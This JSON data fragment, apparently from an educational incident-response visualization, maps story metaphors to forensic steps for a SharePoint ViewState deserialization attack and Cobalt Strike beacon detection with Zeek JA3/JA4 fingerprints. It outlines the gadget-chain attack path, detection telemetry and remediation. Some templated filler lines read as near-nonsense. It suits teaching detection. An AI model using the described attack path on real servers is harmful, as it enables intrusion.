          "storyExcerpt": "Investigators trace how an outsider obtained or guessed a publicly leaked office sealing stamp from the configuration binder and began sending small test receipts to verify that the front desk…",
          "technicalParallel": "Under the hood, the observed step executes Application Log: Source=\"ASP.NET 4.0.30319.0\" EventID=1309 EventCode=4005 (Viewstate verification failed) (which executes the technical command / telemetry…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Test",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Leaked office sealing stamp",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses leaked office sealing stamp to advance toward small test receipts.",
          "technicalParallel": "Before obtaining the valid key (or while probing with known pre-shared keys), failed __VIEWSTATE payloads trigger Windows Application EventID 1309 (Source: ASP.NET 4.0.30319.0, Event code: 4005…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Test",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Front desk arrival book",
          "storyExcerpt": "Behind the scenes, front desk arrival book captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 1309 (recording LogChannel=Application , Source: ASP.NET 4.0.30319.0, EventID=1309 , EventCode 4005, ViewState MAC Failure…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Sealing Stamp",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Spring Receipt",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forensic Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "dfir-sharepoint-iis-viewstate-losformatter-deserialization",
      "sectionKey": "step-2",
      "sceneKind": "net-viewstate-deser-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Signed __VIEWSTATE LosFormatter / TypeConfuseDelegate Deserialization (IIS W3C Access Log)",
      "storyCue": "Once the seal checks out, the outsider submits a bulky, validly stamped receipt containing a chain of self-triggering parts. Trusting the valid wax seal, the office clerk unfolds the receipt and accidentally triggers arbitrary code.",
      "technicalCue": "T1059 · EXECUTION — Once the attacker obtains the web.config validationKey (via a path traversal, backup leak, or CVE-2023-29357 auth bypass), they sign a TypeConfuseDelegate / ActivitySurrogateSelector gadget…",
      "storyMappings": [
        {
          "storyTerm": "Validly stamped bulky receipt",
          "technicalTerm": "HMAC-signed malicious __VIEWSTATE POST payload",
          "tone": "amber"
        },
        {
          "storyTerm": "Receipt unfolding engine",
          "technicalTerm": "ASP.NET ObjectStateFormatter / LosFormatter deserializer",
          "tone": "sky"
        },
        {
          "storyTerm": "Self-triggering gadget parts",
          "technicalTerm": "TypeConfuseDelegate .NET deserialization gadget chain",
          "tone": "rose"
        },
        {
          "storyTerm": "Unexpected desk exception",
          "technicalTerm": "Application Event Log and SharePoint ULS error traces",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-viewstate-deser-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Validly stamped bulky receipt",
          "subtitle": "HMAC-signed malicious __VIEWSTATE POST payload",
          "tone": "amber"
        },
        {
          "id": "net-viewstate-deser-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Receipt unfolding engine",
          "subtitle": "ASP.NET ObjectStateFormatter / LosFormatter deserializer",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Seal Out",
          "stageTag": "STEP 02 · SETUP",
          "title": "Validly stamped bulky receipt",
          "storyExcerpt": "Once the seal checks out, the outsider submits a bulky, validly stamped receipt containing a chain of self-triggering parts.",
          "technicalParallel": "Under the hood, the observed step executes IIS W3C Log Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status sc-bytes cs-bytes (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Wax Seal",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Receipt unfolding engine",
          "storyExcerpt": "Trusting the valid wax seal, the office clerk unfolds the receipt and accidentally triggers arbitrary code.",
          "technicalParallel": "Once the attacker obtains the web.config validationKey (via a path traversal, backup leak, or CVE-2023-29357 auth bypass), they sign a TypeConfuseDelegate / ActivitySurrogateSelector gadget chain with…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Self-triggering",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Unexpected desk exception",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across unexpected desk exception while locking down self-triggering gadget parts.",
          "technicalParallel": "Documented in Network Event 200 (recording LogFile=C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex261103.log, UriStem=/_layouts/15/Picker.aspx, RequestBytes=cs-bytes=8420 , Signed ObjectStateFormatter Payload…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Sealing Stamp",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Spring Receipt",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forensic Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059"
    },
    "step-3": {
      "scenarioId": "dfir-sharepoint-iis-viewstate-losformatter-deserialization",
      "sectionKey": "step-3",
      "sceneKind": "net-viewstate-deser-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "w3wp.exe Child Process Creation & MachineKey Rotation Remediation (Sysmon EventID 1)",
      "storyCue": "Endpoint sensors catch the web clerk suddenly launching system maintenance tools. Responders immediately revoke and replace the stolen sealing stamp across every branch desk so forged receipts stop working permanently.",
      "technicalCue": "T1190 · EXECUTION — Inside w3wp.exe, System.Web.UI.ObjectStateFormatter.Deserialize() reconstructs the gadget chain and invokes System.Diagnostics.Process.Start(\"cmd.exe\"...), generating Sysmon EventID 1 with…",
      "storyMappings": [
        {
          "storyTerm": "Web clerk worker",
          "technicalTerm": "IIS w3wp.exe worker spawning cmd.exe or powershell.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Endpoint motion sensor",
          "technicalTerm": "Sysmon EventID 1 process creation lineage alert",
          "tone": "sky"
        },
        {
          "storyTerm": "Replacing the sealing stamp",
          "technicalTerm": "Rotating ASP.NET MachineKey across the SharePoint farm",
          "tone": "rose"
        },
        {
          "storyTerm": "Branch desk synchronization",
          "technicalTerm": "Running Update-SPMachineKey and restarting IIS pools",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-viewstate-deser-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Web clerk worker",
          "subtitle": "IIS w3wp.exe worker spawning cmd.exe or powershell.exe",
          "tone": "amber"
        },
        {
          "id": "net-viewstate-deser-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Endpoint motion sensor",
          "subtitle": "Sysmon EventID 1 process creation lineage alert",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Web Desk",
          "stageTag": "STEP 03 · SETUP",
          "title": "Web clerk worker",
          "storyExcerpt": "Endpoint sensors catch the web clerk suddenly launching system maintenance tools.",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe -> Image=C:\\Windows\\System32\\cmd.exe (which invokes or targets the host daemon/process…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Desk So",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Endpoint motion sensor",
          "storyExcerpt": "Responders immediately revoke and replace the stolen sealing stamp across every branch desk so forged receipts stop working permanently.",
          "technicalParallel": "Inside w3wp.exe, System.Web.UI.ObjectStateFormatter.Deserialize() reconstructs the gadget chain and invokes System.Diagnostics.Process.Start(\"cmd.exe\"...), generating Sysmon EventID 1 with…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Desk",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Branch desk synchronization",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across branch desk synchronization while locking down replacing the sealing stamp.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording EventID=1 , Sysmon ProcessCreate, ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe, ChildImage=C:\\Windows\\System32\\cmd.exe, MandatoryIrStep=Rotate web.config…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Sealing Stamp",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Spring Receipt",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forensic Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    }
  },
  "dfir-zeek-ja3-ja4-cobalt-strike-malleable-c2-beaconing": {
    "briefing": {
      "scenarioId": "dfir-zeek-ja3-ja4-cobalt-strike-malleable-c2-beaconing",
      "sectionKey": "briefing",
      "sceneKind": "net-zeek-ja3-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1071.001",
      "title": "Zeek ssl.log JA3/JA4 Fingerprint & Malleable C2 Jitter Beaconing Forensics — Story-to-Technical Overview",
      "storyCue": "A covert courier disguises every sealed dispatch pouch to look like ordinary office mail, yet the unique way they knock at the gate, the blank default seal printed by their remote warehouse, and the rhythmic ticking of their hourly pickups expose the secret route to observant harbor inspectors.",
      "technicalCue": "LATERAL & C2: TLS ClientHello Fingerprinting (JA3 & JA4) in Zeek ssl.log -> LATERAL & C2: ServerHello JA3S Correlation & Java KeyStore X.509 Certificate Anomaly (x509.log) -> LATERAL & C2: Periodic Sleep/Jitter Statistical Histogram Analysis in Zeek conn.log (RITA Beaconing Score)",
      "storyMappings": [
        {
          "storyTerm": "Unique way of knocking",
          "technicalTerm": "TLS ClientHello JA3 and JA4 handshake fingerprints",
          "tone": "amber"
        },
        {
          "storyTerm": "Blank default warehouse seal",
          "technicalTerm": "JA3S ServerHello and default Java KeyStore X.509 certificate",
          "tone": "sky"
        },
        {
          "storyTerm": "Rhythmic hourly pickups",
          "technicalTerm": "Periodic beacon sleep and jitter intervals in conn.log",
          "tone": "rose"
        },
        {
          "storyTerm": "Harbor network inspectors",
          "technicalTerm": "Zeek ssl.log and conn.log forensic telemetry",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-zeek-ja3-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Unique way of knocking",
          "subtitle": "TLS ClientHello JA3 and JA4 handshake fingerprints",
          "tone": "amber"
        },
        {
          "id": "net-zeek-ja3-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Blank default warehouse seal",
          "subtitle": "JA3S ServerHello and default Java KeyStore X.509 certificate",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Even Lock",
          "stageTag": "STAGE 01 · LATERAL & C2",
          "title": "TLS ClientHello Fingerprinting (JA3 & JA4) in Zeek ssl.log",
          "storyExcerpt": "Even when the courier swaps envelopes to mimic a famous delivery company, harbor inspectors record the exact sequence of handshakes and lock preferences used at the gate, catching a mismatch against…",
          "technicalParallel": "Under the hood, the observed step executes Zeek ssl.log Fields: uid, id.orig_h, id.resp_h, version, cipher, server_name, ja3, ja4 (which executes the technical command / telemetry directive , Zeek…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Seal",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "ServerHello JA3S Correlation & Java KeyStore X.509 Certificate Anomaly (x509.log)",
          "storyExcerpt": "Inspectors next examine how the distant warehouse answers the knock and inspect its wax return stamp, spotting a generic blank seal and matching reply pattern characteristic of an out-of-the-box command…",
          "technicalParallel": "Under the hood, the observed step executes Zeek ssl.log: ja3=\"72a589da586844d7f0818ce684948eea\" + ja3s=\"fd4bc6cea4877646ccd62f0792ec0b62\" (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Plot Wall",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "Periodic Sleep/Jitter Statistical Histogram Analysis in Zeek conn.log (RITA Beaconing Score)",
          "storyExcerpt": "Finally, inspectors plot every departure timestamp on a wall chart and notice the courier stepping out on a steady drumbeat with only small randomized pauses, confirming an automated check-in loop rather…",
          "technicalParallel": "Under the hood, the observed step executes Zeek conn.log Aggregation: count=1440 mean_interval=60.02s min_delta=48.1s max_delta=71.9s (20% Jitter) (which executes the technical command / telemetry…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Harbor Bridge",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Beacon Tower",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Handshake Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-zeek-ja3-ja4-cobalt-strike-malleable-c2-beaconing",
      "sectionKey": "step-1",
      "sceneKind": "net-zeek-ja3-step-1",
      "stageBadge": "STEP #1 · LATERAL & C2",
      "title": "TLS ClientHello Fingerprinting (JA3 & JA4) in Zeek ssl.log",
      "storyCue": "Even when the courier swaps envelopes to mimic a famous delivery company, harbor inspectors record the exact sequence of handshakes and lock preferences used at the gate, catching a mismatch against genuine browser traffic.",
      "technicalCue": "T1071.001 · LATERAL & C2 — When the implant initiates an outbound TLS 1.2/1.3 handshake via WinInet or WinHttp from 10.10.4.15, Zeek inspects the unencrypted TLS ClientHello packet (TLS Version, Cipher Suites…",
      "storyMappings": [
        {
          "storyTerm": "Recorded handshake sequence",
          "technicalTerm": "JA3 MD5 and JA4 client TLS fingerprint hashes",
          "tone": "amber"
        },
        {
          "storyTerm": "Swapped outer envelope",
          "technicalTerm": "Malleable C2 spoofed HTTP headers and User-Agent",
          "tone": "sky"
        },
        {
          "storyTerm": "Harbor gate ledger",
          "technicalTerm": "Zeek ssl.log encrypted session metadata",
          "tone": "rose"
        },
        {
          "storyTerm": "Genuine browser crowd",
          "technicalTerm": "Baseline enterprise browser TLS cipher suite profiles",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zeek-ja3-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Recorded handshake sequence",
          "subtitle": "JA3 MD5 and JA4 client TLS fingerprint hashes",
          "tone": "amber"
        },
        {
          "id": "net-zeek-ja3-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Swapped outer envelope",
          "subtitle": "Malleable C2 spoofed HTTP headers and User-Agent",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Even Lock",
          "stageTag": "STEP 01 · SETUP",
          "title": "Recorded handshake sequence",
          "storyExcerpt": "Even when the courier swaps envelopes to mimic a famous delivery company, harbor inspectors record the exact sequence of handshakes and lock preferences used at the gate, catching a mismatch…",
          "technicalParallel": "Under the hood, the observed step executes Zeek ssl.log Fields: uid, id.orig_h, id.resp_h, version, cipher, server_name, ja3, ja4 (which executes the technical command / telemetry directive , Zeek…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Gate",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Swapped outer envelope",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses swapped outer envelope to advance toward harbor gate ledger.",
          "technicalParallel": "When the implant initiates an outbound TLS 1.2/1.3 handshake via WinInet or WinHttp from 10.10.4.15, Zeek inspects the unencrypted TLS ClientHello packet (TLS Version, Cipher Suites, Extensions, Elliptic…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Gate",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Genuine browser crowd",
          "storyExcerpt": "Behind the scenes, genuine browser crowd captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Network Event 443 (recording ZeekLogStream=ssl.log, ClientJa3Hash=72a589da586844d7f0818ce684948eea , WinInet Stack without Browser ALPN…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Harbor Bridge",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Beacon Tower",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Handshake Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1071.001"
    },
    "step-2": {
      "scenarioId": "dfir-zeek-ja3-ja4-cobalt-strike-malleable-c2-beaconing",
      "sectionKey": "step-2",
      "sceneKind": "net-zeek-ja3-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "ServerHello JA3S Correlation & Java KeyStore X.509 Certificate Anomaly (x509.log)",
      "storyCue": "Inspectors next examine how the distant warehouse answers the knock and inspect its wax return stamp, spotting a generic blank seal and matching reply pattern characteristic of an out-of-the-box command post.",
      "technicalCue": "T1573.002 · LATERAL & C2 — Even when a C2 operator customizes the Malleable C2 HTTP profile, the underlying Java/Netty TLS listener on the TeamServer produces a characteristic ServerHello response…",
      "storyMappings": [
        {
          "storyTerm": "Distant warehouse reply pattern",
          "technicalTerm": "JA3S TLS ServerHello response fingerprint",
          "tone": "amber"
        },
        {
          "storyTerm": "Generic blank wax stamp",
          "technicalTerm": "Self-signed or default Java KeyStore X.509 certificate",
          "tone": "sky"
        },
        {
          "storyTerm": "Matched pair check",
          "technicalTerm": "Correlating JA3 client hash with JA3S server hash",
          "tone": "rose"
        },
        {
          "storyTerm": "Out-of-the-box command post",
          "technicalTerm": "Cobalt Strike Team Server TLS listener",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zeek-ja3-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Distant warehouse reply pattern",
          "subtitle": "JA3S TLS ServerHello response fingerprint",
          "tone": "amber"
        },
        {
          "id": "net-zeek-ja3-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Generic blank wax stamp",
          "subtitle": "Self-signed or default Java KeyStore X.509 certificate",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Next How",
          "stageTag": "STEP 02 · SETUP",
          "title": "Distant warehouse reply pattern",
          "storyExcerpt": "Inspectors next examine how the distant warehouse answers the knock and inspect its wax return stamp, spotting a generic blank seal and matching reply pattern characteristic of an…",
          "technicalParallel": "Under the hood, the observed step executes Zeek ssl.log: ja3=\"72a589da586844d7f0818ce684948eea\" + ja3s=\"fd4bc6cea4877646ccd62f0792ec0b62\" (which executes the technical command / telemetry directive…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Wax",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Generic blank wax stamp",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses generic blank wax stamp to advance toward matched pair check.",
          "technicalParallel": "Even when a C2 operator customizes the Malleable C2 HTTP profile, the underlying Java/Netty TLS listener on the TeamServer produces a characteristic ServerHello response…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Pair",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Out-of-the-box command post",
          "storyExcerpt": "Behind the scenes, out-of-the-box command post captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in IDS Alert Event 2028412 (recording ServerJa3sHash=fd4bc6cea4877646ccd62f0792ec0b62 , Java TLS Server Stack, ServerJa4s=t120200_c02f_5333, CertValidationStatus=self signed certificate under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Harbor Bridge",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Beacon Tower",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Handshake Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1573.002"
    },
    "step-3": {
      "scenarioId": "dfir-zeek-ja3-ja4-cobalt-strike-malleable-c2-beaconing",
      "sectionKey": "step-3",
      "sceneKind": "net-zeek-ja3-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Periodic Sleep/Jitter Statistical Histogram Analysis in Zeek conn.log (RITA Beaconing Score)",
      "storyCue": "Finally, inspectors plot every departure timestamp on a wall chart and notice the courier stepping out on a steady drumbeat with only small randomized pauses, confirming an automated check-in loop rather than human browsing.",
      "technicalCue": "T1029 · LATERAL & C2 — Aggregating 24 hours of Zeek conn.log records between 10.10.4.15 and 198.51.100.200:443 reveals 1,440 connections with inter-arrival delta times uniformly distributed between 48.0s and 72.0s…",
      "storyMappings": [
        {
          "storyTerm": "Departure timestamp chart",
          "technicalTerm": "Inter-arrival time histogram built from Zeek conn.log",
          "tone": "amber"
        },
        {
          "storyTerm": "Steady automated drumbeat",
          "technicalTerm": "Configured C2 sleep interval with bounded jitter",
          "tone": "sky"
        },
        {
          "storyTerm": "Small randomized pauses",
          "technicalTerm": "Statistical jitter percentage around a fixed mean",
          "tone": "rose"
        },
        {
          "storyTerm": "Human browsing crowd",
          "technicalTerm": "Irregular bursty user web traffic distribution",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-zeek-ja3-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Departure timestamp chart",
          "subtitle": "Inter-arrival time histogram built from Zeek conn.log",
          "tone": "amber"
        },
        {
          "id": "net-zeek-ja3-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Steady automated drumbeat",
          "subtitle": "Configured C2 sleep interval with bounded jitter",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Plot Wall",
          "stageTag": "STEP 03 · SETUP",
          "title": "Departure timestamp chart",
          "storyExcerpt": "Finally, inspectors plot every departure timestamp on a wall chart and notice the courier stepping out on a steady drumbeat with only small randomized pauses, confirming an automated check-in…",
          "technicalParallel": "Under the hood, the observed step executes Zeek conn.log Aggregation: count=1440 mean_interval=60.02s min_delta=48.1s max_delta=71.9s (20% Jitter) (which executes the technical command / telemetry…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Steady automated drumbeat",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses steady automated drumbeat to advance toward small randomized pauses.",
          "technicalParallel": "Aggregating 24 hours of Zeek conn.log records between 10.10.4.15 and 198.51.100.200:443 reveals 1,440 connections with inter-arrival delta times uniformly distributed between 48.0s and 72.0s (60-second…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Plot Wall",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Human browsing crowd",
          "storyExcerpt": "Behind the scenes, human browsing crowd captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Network Event 98 (recording ZeekLogStream=conn.log , Time-Series Aggregation, ConfiguredSleepJitter=60s Sleep / 20% Uniform Jitter , 48s - 72s window, BeaconConfidenceScore=0.984…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Harbor Bridge",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Beacon Tower",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Handshake Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1029"
    }
  }
};
